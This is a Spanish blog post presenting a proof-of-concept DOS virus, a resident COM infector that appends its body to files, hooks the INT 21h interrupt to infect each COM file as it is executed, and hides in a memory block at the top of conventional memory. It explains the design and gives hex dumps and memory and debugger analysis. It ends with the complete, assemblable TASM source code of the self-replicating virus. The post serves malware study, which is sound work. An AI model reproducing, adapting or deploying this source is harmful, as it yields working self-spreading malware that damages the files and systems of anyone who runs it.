---
categories: [Malware, Programación]
layout: post
published: true
tags: [16-bit, ASM-x86, DOS, PoC, TASM, Virus]
title: "Prueba de concepto - Virus: x86/DOS, COM, Postpending, Residente en tope de memoria convencional con MCB"
toc: true
---

Prueba de concepto de virus en la plataforma x86/DOS con estrategia de infección por 
postpending (adición posterior) en archivos COM. El virus permanece residente ocultándose 
en el tope de memoria convencional con un bloque de memoria reservado. Intercepta los 
servicios I/O de DOS para infectar archivos antes de ser ejecutados.

## Método de infección
Durante la infección, el virus reemplaza los primeros bytes del archivo huésped 
(cabezal original) con una instrucción `JMP` (cabezal viral) que dirige el flujo 
de ejecución hacia el final del archivo donde se añade el cuerpo viral. El cabezal 
original reemplazado es guardado en el cuerpo viral.

{% img infection.png | {"width":"450"} %}

Cuando un archivo infectado es ejecutado, el virus se carga en memoria junto con este y 
se ejecuta primero realizando sus propias acciones, al terminar restaura el cabezal original 
en el offset `CS:0100` (dirección de memoria donde se cargan los archivos COM en DOS) y salta 
hacia dicho offset para permitirle al huésped su ejecución normal. Esto último dificulta la 
detección por parte del usuario.

El cabezal viral contiene además una firma, el byte `'V'`, utilizada para reconocimiento 
de archivos ya infectados.

La primer generación del virus es diferente a las siguientes. La primera no tiene cabezal 
viral, ya que no está adherida a un huésped. Las siguientes generaciones al estar adheridas 
a un huésped se diferencian por tener cabezal y cuerpo viral.

Como resultado de la infección:
* Los archivos infectados ocuparán más espacio al contener el código viral. Con técnicas 
  de _stealth_ esta información se puede ocultar del usuario para dificultar su detección.
* Los archivos infectados tendrán un tiempo de ejecución mayor al incluir la pre 
  ejecución del virus.

## Residencia en memoria
El virus permanece residente ocultandose en el tope de memoria convencional (por debajo de 640KB - segmento A000). 
Para esto reduce la cantidad de memoria asignada al archivo huésped dejando suficiente espacio 
libre para un bloque de memoria con el código viral y su MCB correspondiente, luego reserva 
dicho bloque y establece a DOS como su dueño para que no sea liberado al finalizar la ejecucion 
del huésped. Durante la infección, el virus reconoce si ya se encuentra residente mediante un 
servicio propio en la interrupción 21h.

{% img memory.png | {"width":"450"} %}

## Método de propagación
El virus modifica el handler original de la interrupción 21h cambiando el vector del handler en 
la IVT (Interrupt Vector Table) para interceptar las llamadas a los servicios I/O de DOS. Esto 
tiene dos objetivos:
* Proveer un servicio de reconocimiento propio para saber si ya se encuentra residente en memoria.
* Detectar las ejecuciones de archivos en el sistema para infectarlos antes de que estos se ejecuten.

## Otros detalles
* Se utiliza una técnica básica para calcular el $\Delta$ offset, este es el posicionamiento
  relativo del virus en el archivo infectado. Esta técnica es detectada por cualquier 
  anti-virus decente.
* El virus no verifica que el tamaño del archivo COM sea adecuado para la infección. Si luego 
  de la infección el tamaño total supera los 64KB, ya no es un archivo COM válido.

## Flujo de ejecución
Al ejecutarse un archivo infectado, el virus se hace residente en memoria y modifica la IVT:

{% img flow1.png | {"width":"480"} %}

Cuando el virus ya es residente en memoria, intercepta todas las llamadas a la interrupción 21h:

{% img flow2.png | {"width":"480"} %}

## Análisis estático
Hex dump de un archivo sano de tamaño 80 bytes:

<pre class="ovf">
<span>Offset  00 01 02 03 04 05 06 07  ANSI</span>
<span>0x0000</span>  <span>B4 09 BA 39 01 CD 21 90</span>  <span>´.º9.Í!.</span>
<span>0x0008</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0010</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0018</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0020</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0028</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0030</span>  <span>90 90 90 90 90 B4 00 CD</span>  <span>.....´.Í</span>
<span>0x0038</span>  <span>21 54 68 69 73 20 69 73</span>  <span>!This is</span>
<span>0x0040</span>  <span>20 61 20 68 6F 73 74 20</span>  <span> a host </span>
<span>0x0048</span>  <span>66 69 6C 65 21 0D 0A 24</span>  <span>file!..$</span>
</pre>

Hex dump del archivo infectado:

<pre class="ovf">
<span>Offset  00 01 02 03 04 05 06 07  ANSI</span>
<span>0x0000</span>  <span class="vs">E9 4D 00 56</span> <span>01 CD 21 90</span>  <span class="vs">éM.V</span><span>.Í!.</span>  Cabezal viral
<span>0x0008</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0010</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0018</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0020</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0028</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0030</span>  <span>90 90 90 90 90 B4 00 CD</span>  <span>.....´.Í</span>
<span>0x0038</span>  <span>21 54 68 69 73 20 69 73</span>  <span>!This is</span>
<span>0x0040</span>  <span>20 61 20 68 6F 73 74 20</span>  <span> a host </span>
<span>0x0048</span>  <span>66 69 6C 65 21 0D 0A 24</span>  <span>file!..$</span>
<span>0x0050</span>  <span class="vs">E8 00 00 5D 81 ED 0B 01</span>  <span class="vs">è..].í..</span>  Cuerpo viral
<span>0x0058</span>  <span class="vs">B8 CD AB CD 21 3D 9A 02</span>  <span class="vs">¸Í«Í!=š.</span>
<span>0x0060</span>  <span class="vs">74 4D B4 4A BB FF FF CD</span>  <span class="vs">tM´J»ÿÿÍ</span>
<span>0x0068</span>  <span class="vs">21 B4 4A 83 EB 14 CD 21</span>  <span class="vs">!´Jƒë.Í!</span>
<span>0x0070</span>  <span class="vs">B4 48 BB 13 00 CD 21 48</span>  <span class="vs">´H»..Í!H</span>
<span>0x0078</span>  <span class="vs">8E C0 26 C6 06 00 00 5A</span>  <span class="vs">ŽÀ&Æ...Z</span>
<span>0x0080</span>  <span class="vs">26 C7 06 01 00 08 00 8D</span>  <span class="vs">&Ç......</span>
<span>0x0088</span>  <span class="vs">B6 08 01 40 8E C0 BF 00</span>  <span class="vs">¶..@ŽÀ¿.</span>
<span>0x0090</span>  <span class="vs">00 B9 20 01 F3 A4 8E D8</span>  <span class="vs">.¹ .ó¤ŽØ</span>
<span>0x0098</span>  <span class="vs">B4 35 B0 21 CD 21 89 1E</span>  <span class="vs">´5°!Í!‰.</span>
<span>0x00A0</span>  <span class="vs">18 01 8C 06 1A 01 B4 25</span>  <span class="vs">..Œ...´%</span>
<span>0x00A8</span>  <span class="vs">B0 21 BA 76 00 CD 21 8C</span>  <span class="vs">°!ºv.Í!Œ</span>
<span>0x00B0</span>  <span class="vs">C8 8E D8 8E C0 B9 04 00</span>  <span class="vs">ÈŽØŽÀ¹..</span>
<span>0x00B8</span>  <span class="vs">8D B6 24 02 BF 00 01 F3</span>  <span class="vs">.¶$.¿..ó</span>
<span>0x00C0</span>  <span class="vs">A4 B8 00 01 FF E0 3D CD</span>  <span class="vs">¤¸..ÿà=Í</span>
<span>0x00C8</span>  <span class="vs">AB 74 08 3D 00 4B 74 07</span>  <span class="vs">«t.=.Kt.</span>
<span>0x00D0</span>  <span class="vs">E9 94 00 B8 9A 02 CF 9C</span>  <span class="vs">é”.¸š.Ïœ</span>
<span>0x00D8</span>  <span class="vs">50 53 51 52 56 1E 8B F2</span>  <span class="vs">PSQRV.‹ò</span>
<span>0x00E0</span>  <span class="vs">AC 0A C0 74 13 3C 2E 75</span>  <span class="vs">¬.Àt.&lt;.u</span>
<span>0x00E8</span>  <span class="vs">F7 AC 3C 43 75 0A AC 3C</span>  <span class="vs">÷¬&lt;Cu.¬&lt;</span>
<span>0x00F0</span>  <span class="vs">4F 75 05 AC 3C 4D 74 02</span>  <span class="vs">Ou.¬&lt;Mt.</span>
<span>0x00F8</span>  <span class="vs">EB 62 B4 3D B0 02 CD 21</span>  <span class="vs">ëb´=°.Í!</span>
<span>0x0100</span>  <span class="vs">72 5E 93 0E 1F B4 3F BA</span>  <span class="vs">r^“..´?º</span>
<span>0x0108</span>  <span class="vs">1C 01 B9 04 00 CD 21 72</span>  <span class="vs">..¹..Í!r</span>
<span>0x0110</span>  <span class="vs">4B 80 3E 1F 01 56 74 44</span>  <span class="vs">K€&gt;..VtD</span>
<span>0x0118</span>  <span class="vs">B4 42 B0 02 33 C9 33 D2</span>  <span class="vs">´B°.3É3Ò</span>
<span>0x0120</span>  <span class="vs">CD 21 72 38 A3 20 01 B4</span>  <span class="vs">Í!r8£ .´</span>
<span>0x0128</span>  <span class="vs">40 B9 20 01 BA 00 00 CD</span>  <span class="vs">@¹ .º..Í</span>
<span>0x0130</span>  <span class="vs">21 72 29 A1 20 01 2D 03</span>  <span class="vs">!r)¡ .-.</span>
<span>0x0138</span>  <span class="vs">00 C6 06 22 01 E9 A3 23</span>  <span class="vs">.Æ.".é£#</span>
<span>0x0140</span>  <span class="vs">01 C6 06 25 01 56 B4 42</span>  <span class="vs">.Æ.%.V´B</span>
<span>0x0148</span>  <span class="vs">B0 00 33 C9 33 D2 CD 21</span>  <span class="vs">°.3É3ÒÍ!</span>
<span>0x0150</span>  <span class="vs">72 0A B4 40 B9 04 00 BA</span>  <span class="vs">r.´@¹..º</span>
<span>0x0158</span>  <span class="vs">22 01 CD 21 B4 3E CD 21</span>  <span class="vs">".Í!´&gt;Í!</span>
<span>0x0160</span>  <span class="vs">1F 5E 5A 59 5B 58 9D EA</span>  <span class="vs">.^ZY[X.ê</span>
<span>0x0168</span>  <span class="vs">A0 14 00 F0</span> <span>B4 09 BA 39</span>  <span class="vs"> ..ð</span><span>´.º9</span>  Cabezal original
</pre>
<style>
  pre.ovf span { color: #000; }
  pre.ovf span:first-of-type { line-height:200% }
  pre.ovf span.vs { color: #ff0000 }
</style>

## Análisis dinámico
Se considera un archivo infectado VTEST.COM en un ambiente MS-DOS 6.22, 
Microsoft Virtual PC 6.0 con VM Additions.

### Uso de memoria

**Antes de la infección**  
Resultado de `MEM /C`:

<pre>Name           Total       =   Conventional   +   Upper Memory
  --------  ----------------   ----------------   ----------------
  MSDOS       16,157   (16K)     16,157   (16K)          0    (0K)
  SETVER         480    (0K)        480    (0K)          0    (0K)
  HIMEM        1,120    (1K)      1,120    (1K)          0    (0K)
  DISPLAY      8,304    (8K)      8,304    (8K)          0    (0K)
  CDROM        4,224    (4K)      4,224    (4K)          0    (0K)
  COMMAND      2,928    (3K)      2,928    (3K)          0    (0K)
  SMARTDRV    29,024   (28K)     29,024   (28K)          0    (0K)
  KEYB         6,944    (7K)      6,944    (7K)          0    (0K)
  FSHARE      26,576   (26K)     26,576   (26K)          0    (0K)
  IDLE           528    (1K)        528    (1K)          0    (0K)
  MSCDEX      32,096   (31K)     32,096   (31K)          0    (0K)
  MOUSE        8,880    (9K)      8,880    (9K)          0    (0K)
  Free       516,976  (505K)    516,976  (505K)          0    (0K)

Memory Summary:
  Type of Memory       Total   =    Used    +    Free
  ----------------  ----------   ----------   ----------
  Conventional         654,336      137,360      516,976
  Upper                      0            0            0
  Reserved                   0            0            0
  Extended (XMS)    15,663,104    2,162,688   13,500,416
  ----------------  ----------   ----------   ----------
  Total memory      16,317,440    2,300,048   14,017,392
  Total under 1 MB     654,336      137,360      516,976
</pre>

**Después de la infección**  
Resultado de `MEM /C`:

<pre class="ovf">Name           Total       =   Conventional   +   Upper Memory
  --------  ----------------   ----------------   ----------------
  MSDOS       16,477   (16K)     16,477   (16K)          0    (0K)
  SETVER         480    (0K)        480    (0K)          0    (0K)
  HIMEM        1,120    (1K)      1,120    (1K)          0    (0K)
  DISPLAY      8,304    (8K)      8,304    (8K)          0    (0K)
  CDROM        4,224    (4K)      4,224    (4K)          0    (0K)
  COMMAND      2,928    (3K)      2,928    (3K)          0    (0K)
  SMARTDRV    29,024   (28K)     29,024   (28K)          0    (0K)
  KEYB         6,944    (7K)      6,944    (7K)          0    (0K)
  FSHARE      26,576   (26K)     26,576   (26K)          0    (0K)
  IDLE           528    (1K)        528    (1K)          0    (0K)
  MSCDEX      32,096   (31K)     32,096   (31K)          0    (0K)
  MOUSE        8,880    (9K)      8,880    (9K)          0    (0K)
<span class="vs">  Free       516,656  (505K)    516,656  (505K)          0    (0K)</span>

Memory Summary:
  Type of Memory       Total   =    Used    +    Free
  ----------------  ----------   ----------   ----------
<span class="vs">  Conventional         654,336      137,680      516,656</span>
  Upper                      0            0            0
  Reserved                   0            0            0
  Extended (XMS)    15,663,104    2,162,688   13,500,416
  ----------------  ----------   ----------   ----------
<span class="vs">  Total memory      16,317,440    2,300,368   14,017,072</span>
<span class="vs">  Total under 1 MB     654,336      137,680      516,656</span>
</pre>

No se observan nuevos modulos. Pero disminuye la cantidad de memoria convencional libre 
en 320 bytes.

Información de MCBs en memoria:

<pre class="ovf">
 No.  Address     Size   Id   Owner 
===================================================
  0.     0000     1024        INTERRUPT TABLE 
  1.     0253    20608        DOS PARAMETERS BLOCK 
  2.     075C       64        DOS DATA 
  3.     0761     2640    P   COMMAND.COM ( COPY 1 )
  4.     0807       64        This block is free
  5.     080C      256    E   COMMAND.COM ( COPY 1 )
  6.     081D       80        This block is free
  7.     0823    29008    P   UNKNOWN
  8.     0F39     6928    P   UNKNOWN
  9.     10EB      112    E   C:\VMADD\FSHARE.EXE 
 10.     10F3    26432    P   C:\VMADD\FSHARE.EXE
 11.     1768      112    E   C:\VMADD\IDLE.COM 
 12.     1770    32080    P   UNKNOWN
 13.     1F46      384    P   C:\VMADD\IDLE.COM 
 14.     1F5F      112    E   C:\VMADD\MOUSE.COM 
 15.     1F67     8736    P   C:\VMADD\MOUSE.COM 
 16.     218A   516624        This block is free 
<span class="vs"> 17.     9FAC      304    E   Last MCB ends at 9FC0</span>
</pre>

Hay un nuevo MCB en 9FAC que reserva un bloque de 304 bytes. Este bloque se encuentra 
en el tope de memoria convencional.

El código viral tiene en memoria un tamaño de 294 B (288 B de código + 6 B reservados para datos), 
pero por el alineamiento en párrafos (16 B) el próximo múltiplo de 16 es 
$\lceil\frac{294}{16}\rceil \times 16 = 304 B$. Además, el bloque tiene un MCB correspondiente 
de 16 B, por lo tanto el virus tiene un tamaño total de 320 B.

### Handler de 21h
La IVT ocupa los primeros 1024 bytes de memoria RAM, segmento 0000.
El vector de la interrupción 21h es la dirección de memoria del handler en 
forma de 4 bytes `segmento:offset`, este se encuentra en el offset 84h de la IVT.

**Antes de la infección**
Hex dump de los 4 bytes del vector 21h:

<pre>
-D 0000:0084 L4                                  
0000:0080              E1 20 04 11
</pre>

El handler original de 21h se encuentra en 1104:20E1.

**Después de la infección**
Hex dump de los 4 bytes del vector 21h:

<pre>
-D 0000:0084 L4
0000:0080              76 00 AD 9F
</pre>

El vector ya no es el mismo. 

Desensamblado del handler referenciado por el nuevo vector:

<pre>
-U 9FAD:0076 
9FAD:0076 3DCDAB       CMP    AX,ABCD     ; inicio del handler viral
9FAD:0079 7408         JZ     0083                               
9FAD:007B 3D004B       CMP    AX,4B00                            
9FAD:007E 7407         JZ     0087                               
9FAD:0080 E99400       JMP    0117                               
9FAD:0083 B89A02       MOV    AX,029A                            
9FAD:0086 CF           IRET                                    
9FAD:0087 9C           PUSHF                                     
9FAD:0088 50           PUSH   AX                                 
9FAD:0089 53           PUSH   BX                                 
9FAD:008A 51           PUSH   CX                                 
9FAD:008B 52           PUSH   DX                                 
9FAD:008C 56           PUSH   SI                                 
9FAD:008D 1E           PUSH   DS                                 
9FAD:008E 8BF2         MOV    SI,DX                              
9FAD:0090 AC           LODSB                                     
9FAD:0091 0AC0         OR     AL,AL                              
9FAD:0093 7413         JZ     00A8                               
9FAD:0095 3C2E         CMP    AL,2E                                      
</pre>

## API utilizada
Se utilizan 10 servicios de la DOS API mediante la interrupción de software 21h.

<div class="table-responsive">
<table class="table" >
   <thead class="thead-light">
    <tr>
      <th>Servicio</th>
      <th>AH</th>
      <th>Parámetros</th>
      <th>Retorno</th>
      <th>Versión DOS</th>
    </tr>
  </thead>   
  <tr>
    <td>Terminar programa</td> 
    <td>00h</td>
    <td class="center">-</td>
    <td class="center">-</td>   
    <td>1+</td> 
  </tr>
  <tr>
    <td>Establecer vector en IVT</td> 
    <td>25h</td>
    <td>AL = número de interrupción</td>
    <td>DS:DX = puntero al nuevo handler de la interrupción</td>
    <td>2+</td>  
  </tr> 
  <tr>
    <td>Obtener vector de IVT</td>
    <td>35h</td>
    <td>AL = número de interrupción</td>
    <td>ES:BX = puntero al handler de la interrupción</td>
    <td>2+</td> 
  </tr>
  <tr>
    <td>Abrir archivo existente</td>
    <td>3Dh</td>
    <td>AL = modos de acceso e intercambio<br/>DS:DX -> nombre del archivo (ASCIZ)</td>
    <td>Éxito: CF = 0, AX = handle del archivo <br/>Error: CF = 1, AX = código de error </td>
    <td>2+</td>
  </tr>
  <tr>
    <td>Cerrar archivo</td>
    <td>3Eh</td>
    <td>BX = handle del archivo</td>  
    <td>Éxito: CF = 0, AX destruido <br />Error: CF = 1, AX = código de error</td>    
    <td>2+</td>  
  </tr>
  <tr>
    <td>Lectura de archivo<br/> o dispositivo</td>
    <td>3Fh</td>
    <td>BX = handle del archivo <br/>CX = nro. de bytes <br/>DS:DX -> offset donde guardar datos</td>
    <td>Éxito: CF = 0, AX =  nro. de bytes transferidos <br />Error: CF = 1, AX = código de error</td> 
    <td>2+</td>  
  </tr>
  <tr>
    <td>Escribir en archivo <br/>o dispositivo</td> 
    <td>40h</td>
    <td>BX = handle del archivo <br/>CX = nro. de bytes <br/>DS:DX -> datos a escribir</td>   
    <td>Éxito: CF = 0, AX = nro. de bytes escritos <br />Error: CF = 1, AX = código de error</td>
    <td>2+</td>
  </tr>
  <tr>
    <td>Establecer puntero de archivo</td>
    <td>42h</td>
    <td>AL = código de desplazamiento <br/> BX = handle del archivo <br/> CX = mitad mayor de desplazamiento<br/> DX = mitad menor de desplazamiento</td>   
    <td>Éxito: CF = 0, CX = mitad mayor, DX = mitad menor <br/>Error: CF = 1, AX = código de error
    </td>
    <td>2+</td> 
  </tr>
  <tr>
    <td>Asignar memoria</td>
    <td>48h
  </td>
    <td>BX = tamaño de bloque, en párrafos</td>  
    <td>Éxito: CF = 0, AX = segmento de bloque creado <br/>Error: CF = 1, AX = código de error, BX = cantidad máxima disponible</td>
    <td>2+</td>  
  </tr>
  <tr>
    <td>Modificar asignación de memoria</td>
    <td>4Ah</td>
    <td>ES = segmento de bloque a modificar <br/>BX = nuevo tamaño de bloque</td>
    <td>Éxito: CF = 0 <br/>Error: CF = 1, AX = código de error, BX = cantidad máxima disponible</td>
    <td>2+</td> 
  </tr>
</table>
</div>

## Código fuente
{% highlight nasm linenos %}
;##############################################################################
;# Nombre:        virus://DOS/SillyCR.288
;# Plataforma:    Intel x86
;# SO:            DOS v2.0+
;# Lenguaje:      ASM x86-16 (sintaxis Intel)
;# Herramientas:  TASM v4.1, TLINK v7.1.30
;# Tipo:          Postpending, Resident, COM infector
;# Tamaño:        288 bytes
;# Propagación:   En archivos COM antes de ser ejecutados (INT 21h - AH=4B).
;# Infección:     Postpending en archivos COM (no READ-ONLY).
;# Residente:     Si. En el tope de memoria convencional (0-640KB).
;# Stealth:       No
;# Payload:       No
;##############################################################################

.8086
.model tiny

assume cs:virus, ds:virus

V_OFFSET equ 0 - 100h - 8                            ; offset base para direccionamiento en el segmento viral 

virus segment byte public 'CODE'

    org 100h

start:    
    jmp short body                                   ; cabezal, en las siguientes generaciones aquí
    nop                                              ; habrá un near JMP de 3 bytes
    db  'V'                                          ; firma viral

    mov ah, 00h                                      ; / huésped dummy, solo retorna a DOS
    int 21h                                          ; \

body:    
    call d_offset                                    ; calcular delta offset

d_offset:    
    pop bp
    sub bp, offset d_offset              
    
    mov ax, 0ABCDh                                   ; | AX = 0ABCDh
    int 21h                                          ; |_DOS API - Llamar servicio de reconocimiento del virus
    
    cmp ax, 029Ah                                    ; verificar código de respuesta
    je  run_host                                     ; si es 666 (29Ah), ejecutar huésped
    
    mov ah, 4Ah                                      ; | AH = 4Ah
    mov bx, 0FFFFh                                   ; | BX = cantidad ridícula de memoria
    int 21h                                          ; |_DOS API - Modificar asignación de memoria
                                                     ;             BX = cantidad máxima disponible
 
    mov ah, 4Ah                                      ; | AH = 4Ah
    sub bx, ((ALLOC_SIZE + 15) / 16) + 1             ; | BX = BX menos la memoria que requiere el virus + 1, en párrafos
    int 21h                                          ; |_DOS API - Modificar asignación de memoria                                            

    mov ah, 48h                                      ; | AH = 48h
    mov bx, (ALLOC_SIZE + 15) / 16                   ; | BX = la memoria que requiere el virus, en párrafos
    int 21h                                          ; |_DOS API - Asignar memoria

    dec ax
    mov es, ax                                       ; ES = MCB del segmento viral
    mov byte ptr es:[0000], 'Z'                      ; marcar como fin de la cadena de bloques
    mov word ptr es:[0001], 0008                     ; establecer DOS como dueño del bloque

    lea si, [bp + body]                              ; origen: inicio del código viral en archivo
    inc ax
    mov es, ax                                       ; ES = segmento viral
    mov di, 0                                        ; destino: inicio del código en segmento viral
    mov cx, VIRUS_SIZE                               ; tamaño del virus
    rep movsb                                        ; copiar virus de origen a destino

    mov ds, ax                                       ; DS = segmento viral                         
    mov ah, 35h                                      ; | AH = 35h
    mov al, 21h                                      ; | AL = número de interrupción, 21h
    int 21h                                          ; |_DOS API - Obtener vector en ES:BX

    mov ds:[V_OFFSET + vector_int21], bx             ; guardar vector original de INT 21h
    mov ds:[V_OFFSET + vector_int21 + 2], es
    mov ah, 25h                                      ; | AH = 25h
    mov al, 21h                                      ; | AL = número de interrupción, 21h
    mov dx, V_OFFSET + offset handler_int21h         ; | DS:DX -> dirección del nuevo handler: handler_int21h
    int 21h                                          ; |_DOS API - Cambiar vector                                   

run_host:    
    mov ax, cs
    mov ds, ax                                       ; restaurar DS
    mov es, ax                                       ; restaurar ES
    mov cx, 4
    lea si, [bp + host_head]
    mov di, 100h
    rep movsb                                        ; restaurar cabezal original
    mov ax, 100h
    jmp ax                                           ; saltar a CS:100 y ejecutar huésped  

handler_int21h:    
    cmp ax, 0ABCDh                                   ; llamada de reconocimiento del virus:
    je service_ABCD                                  ;   responder y retornar
    cmp ax, 4B00h                                    ; llamada para ejecutar archivo:
    je infect_file                                   ;   infectar y delegar
    jmp handler_old                                  ; en otro caso, delegar al handler original de INT 21h 

service_ABCD:    
    mov ax, 029Ah                                    ; código de respuesta: 666 (29Ah)
    iret                                             ; retornar de la interrupción

infect_file:    
    pushf                                            ; guardar estado CPU
    push ax                                          ; guardar registros que serán utilizados
    push bx
    push cx
    push dx
    push si
    push ds
                                                     ; por la llamada AX=4B00h, DS:DX apunta al nombre del archivo
    mov si, dx                                       ; verificar que sea extensión ".COM"

loop_str:    
    lodsb
    or al, al
    jz check_fail
    cmp al, '.'
    jne loop_str
    lodsb
    cmp al, 'C'
    jne check_fail
    lodsb
    cmp al, 'O'
    jne check_fail
    lodsb
    cmp al, 'M'
    je check_ok
    
check_fail:    
    jmp close_file

check_ok:    
    mov ah, 3Dh                                      ; | AH = 3Dh
    mov al, 2                                        ; | AL = 2, lectura y escritura
    int 21h                                          ; |_DOS API &#8211; Abrir archivo existente        

    jc exit                                          ; si no se puede abrir archivo, restaurar y delegar
    xchg ax, bx                                      ; handle de archivo en BX
    push cs
    pop ds                                           ; MOV DS, CS
    mov ah, 3Fh                                      ; | AH = 3Fh
    mov dx, V_OFFSET + offset host_head              ; | DS:DX -> destino: buffer para cabezal original
    mov cx, 4                                        ; | CX = tamaño del cabezal, 4 bytes
    int 21h                                          ; |_DOS API - Leer de archivo/dispositivo

    jc close_file                                    ; no se puede leer el archivo, cerrarlo

    cmp byte ptr ds:[V_OFFSET + host_head + 3], 'V'  ; comparar 4to byte con la firma viral 'V'
    je close_file                                    ; si el archivo ya esta marcado, cerrarlo

    mov ah, 42h                                      ;| AH = 42h
    mov al, 2                                        ;| AL = 2, fin del archivo
    xor cx, cx                                       ;| CX = 0
    xor dx, dx                                       ;| DX = 0
    int 21h                                          ;|_DOS API - Establecer puntero en archivo  

    jc close_file                                    ; no se puede trabajar con el archivo, cerrarlo
                     
    mov ds:[V_OFFSET + file_size], ax
    mov ah, 40h                                      ; | AH = 40h
    mov cx, VIRUS_SIZE                               ; | CX = tamaño del virus
    mov dx, 0                                        ; | DS:DX -> origen: inicio del código viral
    int 21h                                          ; |_DOS API - Escribir en archivo/dispositivo  

    jc close_file                                    ; no se puede trabajar con el archivo, cerrarlo

    mov ax, ds:[V_OFFSET + file_size]                ; calcular el largo del JMP para el cabezal viral
    sub ax, 3                                        ; restarle 3 bytes del near JMP
    mov byte ptr ds:[V_OFFSET + tmp_head], 0E9h      ; construir cabezal viral en buffer temporal (E9h = near JMP)
    mov word ptr ds:[V_OFFSET + tmp_head + 1], ax
    mov byte ptr ds:[V_OFFSET + tmp_head + 3], 'V'      

    mov ah, 42h                                      ; | AH = 42h
    mov al, 0                                        ; | AL = 0, principio del archivo
    xor cx, cx                                       ; | CX = 0
    xor dx, dx                                       ; | DX = 0
    int 21h                                          ; |_DOS API - Establecer puntero en archivo   
    
    jc close_file                                    ; no se puede trabajar con el archivo, cerrarlo

    mov ah, 40h                                      ; | AH = 40h
    mov cx, 4                                        ; | CX = tamaño del cabezal, 4 bytes
    mov dx, V_OFFSET + offset tmp_head               ; | DS:DX -> origen: buffer temporal para cabezal viral
    int 21h                                          ; |_DOS API - Escribir en archivo/dispositivo                                   

close_file:    
    mov ah, 3Eh                                      ; | AH = 3Eh
    int 21h                                          ; |_DOS API - Cerrar archivo                      

exit:    
    pop ds                                           ; restaurar registros y estado CPU
    pop si
    pop dx
    pop cx
    pop bx
    pop ax
    popf

handler_old:    
    db 0EAh                                          ; JMP FAR

vector_int21    dw   ?, ?                            ; vector original de INT 21h (4 bytes)
host_head       db   90h, 90h, 90h, 90h              ; buffer para cabezal original
VIRUS_SIZE      equ  ($ - body)                      ; tamaño del virus
file_size       dw   ?                               ; buffer temporal para tamaño del huésped
tmp_head        db   4 dup (?)                       ; buffer temporal para cabezal viral
ALLOC_SIZE      equ  ($ - body)                      ; espacio a reservar para el virus   

virus ends
end start
{% endhighlight %}

## Bibliografía
{% bibliography -q
   @*[key=Szor2005
   || key=Phalcon-Skism,
   || key=Williams1992] 
%} 